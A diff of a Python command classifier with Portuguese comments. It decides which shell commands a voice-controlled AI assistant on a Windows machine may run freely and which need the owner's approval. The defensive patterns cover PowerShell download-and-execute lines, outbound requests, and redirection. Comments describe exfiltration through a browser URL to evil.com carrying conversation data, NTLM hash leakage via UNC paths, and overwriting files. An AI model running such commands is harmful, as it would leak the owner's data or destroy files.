@@ -80,7 +80,12 @@ _DESTRUTIVOS = [
     (r"\bsc\s+(delete|stop)\b", "apaga ou para um serviço do Windows"),
     (r"\btaskkill\s+/f\b", "mata processo à força (Windows)"),
     (r"\bSet-ExecutionPolicy\s+(Bypass|Unrestricted)\b", "afrouxa a política de execução de scripts"),
-    (r"\b(Invoke-WebRequest|iwr|curl|wget)\b.*\|\s*(Invoke-Expression|iex)\b",
+    # `irm` (Invoke-RestMethod) faltava aqui, e era o único da família que
+    # escapava — justamente o apelido mais usado. `irm ... | iex` é a linha com
+    # que quase todo malware de Windows entra hoje. Achado rodando o
+    # classificador na revisão de 02/09/2026.
+    (r"\b(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl|wget)\b"
+     r".*\|\s*(Invoke-Expression|iex)\b",
      "baixa e executa código da internet às cegas (PowerShell)"),
     (r"\biex\s*\(", "executa código dinamicamente (PowerShell)"),
     (r"\bInvoke-Expression\b", "executa código dinamicamente (PowerShell)"),
@@ -159,7 +164,16 @@ _FERRAMENTAS_ALVO = [
 _REDE_GENERICA = [
     (r"\bssh\s+\w+@", "conecta numa máquina remota"),
     (r"\bscp\b.+@", "copia arquivo de/para máquina remota"),
-    (r"\b(curl|wget)\b.+https?://(?!localhost|127\.0\.0\.1)", "acessa um endereço na internet"),
+    # Antes só `curl` e `wget` contavam aqui, e o "alvo" só era reconhecido
+    # quando o endereço vinha em NÚMERO — domínio nunca contava. Resultado
+    # medido em 02/09/2026: mandar o conteúdo de um arquivo do dono por POST
+    # para um servidor lá fora era "um clique", sem a pergunta de autorização.
+    (r"\b(curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b"
+     r".+https?://(?!localhost|127\.0\.0\.1|\[::1\])",
+     "acessa um endereço na internet"),
+    (r"\b(Test-NetConnection|tnc|Test-Connection|New-PSSession|Enter-PSSession)\s+"
+     r"(?!localhost\b|127\.0\.0\.1\b)[\w.-]*[A-Za-z][\w.-]*\.[A-Za-z]{2,}",
+     "sonda ou abre sessão numa máquina lá fora"),
 ]
 
 # --- IP: só conta como "alvo" quando é argumento de ferramenta de rede --------
@@ -219,11 +233,54 @@ _SEGUROS = [
 # Encadeamento e invocação: qualquer um destes DERRUBA a whitelist inteira.
 # Um comando "seguro" que emenda outro não é seguro — o segundo é que manda.
 _ENCADEIA = re.compile(
-    r"[;&|`^\n]"          # ; & && | || ` ^ e quebra de linha
+    r"[;&|`^\n>]"         # ; & && | || ` ^ quebra de linha e > (ver abaixo)
     r"|\$\("               # $(...)  subexpressão
     r"|(?<![\w-])-e(?:nc\w*)?\b",  # -enc / -EncodedCommand
     re.IGNORECASE,
 )
+
+# Por que `>` entrou na lista acima: `echo hax > C:\...\importante.txt` apaga o
+# conteúdo anterior do arquivo sem avisar, e saía como "reversível" — o único
+# trilho que o DERVS aceita confirmar por VOZ. "Reversível" quer dizer "só
+# abre, lista, lê"; redirecionar DESTRÓI. Achado na revisão de 02/09/2026.
+
+# Argumento que tira um comando "seguro" da lista de seguros.
+# `explorer`, `chrome`, `start` e afins são inofensivos abrindo uma pasta ou
+# uma tela — e perigosos abrindo um executável ou um endereço lá fora:
+#   - `start C:\...\a.exe` roda um binário qualquer (e era "reversível", ou
+#     seja, bastava um som na sala para confirmar por voz);
+#   - `chrome https://evil.com/?d=<dados>` é um cano de saída: o cérebro tem a
+#     conversa inteira no contexto e sabe montar a URL;
+#   - `explorer \\host\share` no Windows dispara autenticação para o servidor
+#     remoto, entregando o hash da senha do dono.
+#
+# ONDE ESTÁ A LINHA, e por quê: `chrome https://google.com` continua manso.
+# "Abre o YouTube" é uso diário do dono, e cartão vermelho à toa treina ele a
+# confirmar no automático — aí o "sim" que importa também vem no automático.
+# O que sobe de trilho é a URL que CARREGA DADO: qualquer `?` ou `#` nela. É
+# ali que a conversa dele caberia. Custo desta escolha, dito com todas as
+# letras: uma busca montada como `...google.com/search?q=gatos` passa a pedir
+# um clique, e um endereço que esconda o dado no caminho (sem `?`) escapa.
+_URL = re.compile(r"https?://\S+", re.IGNORECASE)
+_URL_COM_DADO = re.compile(r"https?://\S*[?#]", re.IGNORECASE)
+_CAMINHO_DE_REDE = re.compile(r"(?:^|\s)\\\\[^\\\s]")
+# `com` ficou DE FORA de propósito: `.com` é extensão de executável do DOS, mas
+# também é o fim de quase todo endereço da internet — e `chrome google.com`
+# virava cartão vermelho. Alarme falso é o que treina o dono a dizer "sim" sem
+# ler.
+_ARQUIVO_QUE_EXECUTA = re.compile(
+    r"\.(?:exe|msi|bat|cmd|scr|vbs|vbe|js|jse|wsf|wsh|ps1|psm1|hta|lnk|reg|jar)"
+    r"(?:\s|\"|'|$)",
+    re.IGNORECASE,
+)
+
+
+def _argumento_perigoso(comando: str) -> bool:
+    if _URL_COM_DADO.search(comando) or _CAMINHO_DE_REDE.search(comando):
+        return True
+    # As URLs saem da conta antes de procurar extensão executável: sem isso,
+    # `https://algumsite.js/...` no meio de um endereço acusaria à toa.
+    return bool(_ARQUIVO_QUE_EXECUTA.search(_URL.sub(" ", comando)))
 
 
 def _casa(comando: str, padroes) -> bool:
@@ -234,6 +291,8 @@ def _casa_seguro(comando: str) -> bool:
     """A whitelist só vale para a linha INTEIRA: o comando tem de COMEÇAR com
     um dos nomes seguros e não pode encadear nem invocar mais nada."""
     if _ENCADEIA.search(comando):
+        return False
+    if _argumento_perigoso(comando):
         return False
     return any(re.match(r"\s*(?:" + p + r")", comando, re.IGNORECASE) for p in _SEGUROS)
 
